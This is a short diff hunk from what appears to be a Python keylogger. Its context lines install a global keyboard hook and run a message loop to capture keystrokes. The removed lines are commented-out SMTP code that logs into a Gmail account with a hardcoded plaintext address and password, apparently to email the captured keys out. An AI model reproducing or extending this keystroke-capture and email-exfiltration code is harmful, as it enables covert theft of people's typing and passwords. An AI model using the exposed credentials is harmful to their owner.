@@ -56,7 +56,3 @@ hooks_manager.KeyDown = OnKeyboardEvent
 hooks_manager.HookKeyboard()
 pythoncom.PumpMessages() #red line says it doesn't exist but it does
 
-#server = smtplib.SMTP('arnaudnicholas@gmail.com',587)
-#server.starttls()
-#server.login("arnaudnicholas@gmail.com","StelarFoil71")
-
